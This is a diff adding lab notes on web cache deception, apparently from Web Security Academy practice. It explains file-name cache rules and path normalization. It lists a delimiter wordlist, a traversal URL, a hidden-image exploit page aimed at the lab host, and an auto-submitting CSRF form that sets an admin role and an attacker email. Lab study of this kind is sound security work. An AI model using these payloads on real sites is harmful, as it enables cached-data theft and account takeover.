@@ -191,3 +191,121 @@
 <img width="772" height="289" alt="image" src="https://github.com/user-attachments/assets/efa1b2a6-4329-4e19-8830-ba461a497a78" />
 
 ----------------
+
+### Exploiting file name cache rules
+
+----------------
+
+- Certain files such as robots.txt, index.html, and favicon.ico are common files found on web servers. They're often cached due to their infrequent changes. Cache rules target these files by matching the exact file name string.
+- To identify whether there is a file name cache rule, send a GET request for a possible file and see if the response is cached.
+- To test how the cache normalizes the URL path, send a request with a path traversal sequence and an arbitrary directory before the file name. For example, /profile%2f%2e%2e%2findex.html:
+- If the response is cached, this indicates that the cache normalizes the path to `/index.html`.
+- If the response isn't cached, this indicates that the cache doesn't decode the slash and resolve the dot-segment, interpreting the path as `/profile%2f%2e%2e%2findex.html`.
+
+--------------
+
+### Challenge-: Exploiting exact-match cache rules for web cache deception
+
+---------------
+
+- Delimeter's wordlist->
+
+```text
+!
+"
+#
+$
+%
+&
+'
+(
+)
+*
++
+,
+-
+.
+/
+:
+;
+<
+=
+>
+?
+@
+[
+\
+]
+^
+_
+`
+{
+|
+}
+~
+%21
+%22
+%23
+%24
+%25
+%26
+%27
+%28
+%29
+%2A
+%2B
+%2C
+%2D
+%2E
+%2F
+%3A
+%3B
+%3C
+%3D
+%3E
+%3F
+%40
+%5B
+%5C
+%5D
+%5E
+%5F
+%60
+%7B
+%7C
+%7D
+%7E
+```
+
+- Normalization requires the `cache file` key and also the static resources directory plus a delimeter.See-:
+
+```url
+/my-account;%2f%2e%2e%2fresources%2f%2e%2e%2frobots.txt
+```
+
+- Exploit-:
+
+```html
+<! doctype html>
+<html>
+<img src="https://0acc00430356efd28006038d00d9002c.web-security-academy.net/my-account;%2f%2e%2e%2fresources%2f%2e%2e%2frobots.txt?cache=buster" width="0" height="0" />
+</html>
+```
+
+- CSRF-token stolen, post based CSRF-:
+
+```html
+<html>
+  <body>
+    <form action="" method="POST">
+      <input type="hidden" name="email" value="attacker-controlled@email.com">
+      <input type="hidden" name="role" value="admin">
+    </form>
+    
+    <script>
+      // Automatically submits the form as soon as the page loads
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+```
